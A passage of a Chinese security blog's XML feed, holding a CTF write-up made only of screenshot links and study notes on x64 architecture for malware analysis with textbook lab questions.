id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p><img src="https://i.loli.net/2019/04/29/5cc6485e4323d.png"></p><h2 id="0x02-baby-pwn"><a href="#0x02-baby-pwn" class="headerlink" title="0x02 baby_pwn"></a>0x02 baby_pwn</h2><p><img src="https://i.loli.net/2019/04/29/5cc648783ae12.png"></p><h2 id="0x03-daily"><a href="#0x03-daily" class="headerlink" title="0x03 daily"></a>0x03 daily</h2><p><img src="https://i.loli.net/2019/04/29/5cc648980a41b.png"></p><h2 id="0x04-Double"><a href="#0x04-Double" class="headerlink" title="0x04 Double"></a>0x04 Double</h2><p><img src="https://i.loli.net/2019/04/29/5cc648b6da857.png"></p><h2 id="0x05-bms"><a href="#0x05-bms" class="headerlink" title="0x05 bms"></a>0x05 bms</h2><p><img src="https://i.loli.net/2019/04/29/5cc648d2564fc.png"></p><h2 id="0x06-Virtual"><a href="#0x06-Virtual" class="headerlink" title="0x06 Virtual"></a>0x06 Virtual</h2><p><img src="https://i.loli.net/2019/04/29/5cc648e6070a3.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Reverse&quot;&gt;&lt;a href=&quot;#Reverse&quot; class=&quot;headerlink&quot; title=&quot;Reverse&quot;&gt;&lt;/a&gt;Reverse&lt;/h1&gt;&lt;h2 id=&quot;0x01-easyGo&quot;&gt;&lt;a href=&quot;#0x01-easyGo&quot; class=&quot;headerlink&quot; title=&quot;0x01 easyGo&quot;&gt;&lt;/a&gt;0x01 easyGo&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/04/29/5cc64745afb8d.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="逆向" scheme="https://www.hvnt3r.top/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="PWN" scheme="https://www.hvnt3r.top/tags/PWN/"/>
    
    <category term="CTF" scheme="https://www.hvnt3r.top/tags/CTF/"/>
    
    <category term="WriteUp" scheme="https://www.hvnt3r.top/tags/WriteUp/"/>
    
    <category term="Reverse" scheme="https://www.hvnt3r.top/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>64位恶意代码</title>
    <link href="https://www.hvnt3r.top/2019/04/64%E4%BD%8D%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    <id>https://www.hvnt3r.top/2019/04/64%E4%BD%8D%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/</id>
    <published>2019-04-27T02:58:55.000Z</published>
    <updated>2022-02-16T12:06:42.855Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>x64架构被设计成x86的升级，而指令集没有什么显著的区别，这本书年代久远，当时64位系统并没有普及，因此可能本章的内容并不是特别有价值。</p><p><strong>x64架构与x86的区别：</strong></p><ul><li>所有的地址和指针都是64位的</li><li>所有通用寄存器大小变大</li><li>通用寄存器的数目增长，新的寄存器位R8-R15</li><li>x64支持相对指令指针的数据寻址</li><li>。。。</li></ul><span id="more"></span><p><strong>x64调用约定和栈使用上的差别：</strong>64位系统使用的调用约定与32位中的<code>fastcall</code>调用约定最为相似，调用的前4个参数使用RCX、RDX、R8以及R9寄存器传递，额外的数据保存在栈上。在32位代码中，栈空间可以在函数中使用push和pop指令分配和释放，然而在64位代码中，函数不能在函数体的中间分配任何空间。由于这个特性，函数中间不会有push或者pop指令，这使分析人员更难判断一个函数有多少个参数，因为没有一个简明的方法说明一个内存地址是被作为栈变量使用还是一个函数的参数，同样也无法说明一个寄存器是否正在作为一个参数被使用。</p><p><strong>64位异常处理：</strong>不像32位系统中的异常处理，x64的结构化异常处理不再使用栈，在32位系统中fs:[0]被当作一个到当前异常处理器帧的指针使用，它被保存在栈上，以便每一个函数能够定义自己的异常处理器，但是这样可能会带来一些安全问题。因此在64位中结构化异常处理使用一个存储在PE文件中的静态异常信息表，并且不在栈上存储任何数据。同样<code>.pdata</code>节有一个<code>_IMAGE_RUNTIME_FUNCTION_ENTRY</code>结构是位可执行体中每一个函数准备的，它保存了这个函数的开始和末尾地址，以及指向那个函数异常处理的指针。</p><p><strong>在64位系统上的Windows32位</strong>：微软开发了一个子系统叫做<code>WOW64(Windows32 On Windows64)</code>用来保证32应用程序能在64位系统上运行。WOW64使用x64处理器的32位模式来执行指令，但是对于注册表和文件系统来说仍然需要解决方案，32位和53位进程必须有分开的DLL来避免冲突，因此system32中是64系统的DLL，WOW64中是32位的DLL。</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab-21-1"><a href="#Lab-21-1" class="headerlink" title="Lab 21-1"></a>Lab 21-1</h3><p><strong>问题</strong></p><p><strong>1.当你不带任何参数运行程序会发生什么？</strong></p><p><strong>2.根据你是用的IDA版本，main函数可能没有被自动识别，你如何对main函数的调用？</strong></p><p><strong>3.从0x0000000140001151地址到0x0000000140001161地址的指令在栈上存储了什么？</strong></p><p><strong>4.在不改变二进制程序文件名的前提下，如何让这个程序运行它真正的负载？</strong></p><p><strong>5.0x0000000140001205位置的strcmp函数调用比较了哪两个字符串？</strong></p><p><strong>6.0x00000001400013C8位置的函数接收哪些参数？</strong></p><p><strong>7.有多少个参数被传递给0x0000000140001093位置对CreatProcess函数的调用？你是如何知道的？</strong></p><h3 id="Lab21-2"><a href="#Lab21-2" class="headerlink" title="Lab21-2"></a>Lab21-2</h3><p><strong>分别在32位和64位系统中分析此文件。</strong></p><p><strong>问题</strong></p><p><strong>1.这个代码的资源节有什么有趣的东西？</strong></p><p><strong>2.这个恶意代码是为64位编译的还是32位？</strong></p><p><strong>3.恶意代码是如何识别处它处于的系统环境类型的？</strong></p><p><strong>4.与在32位系统中相比，恶意代码会在64位环境中做哪些不同的事情？</strong></p><p><strong>5.恶意代码会在x86环境下释放出哪些文件？你可以在哪里找到这些文件？</strong></p><p><strong>6.当运行在x64上时，恶意代码丢弃了哪些文件？你能在哪里找到这个或这些文件？</strong></p><p><strong>7.当运行在x64上时，恶意代码启动了什么类型的进程？</strong></p><p><strong>8.这个恶意代码的目的是什么？</strong></p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <summary type="html">&lt;hr&gt;
&lt;h2 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点&lt;/h2&gt;&lt;p&gt;x64架构被设计成x86的升级，而指令集没有什么显著的区别，这本书年代久远，当时64位系统并没有普及，因此可能本章的内容并不是特别有价值。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;x64架构与x86的区别：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;所有的地址和指针都是64位的&lt;/li&gt;
&lt;li&gt;所有通用寄存器大小变大&lt;/li&gt;
&lt;li&gt;通用寄存器的数目增长，新的寄存器位R8-R15&lt;/li&gt;
&lt;li&gt;x64支持相对指令指针的数据寻址&lt;/li&gt;
&lt;li&gt;。。。&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="二进制安全" scheme="https://www.hvnt3r.top/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="逆向" scheme="https://www.hvnt3r.top/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="恶意代码分析" scheme="https://www.hvnt3r.top/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
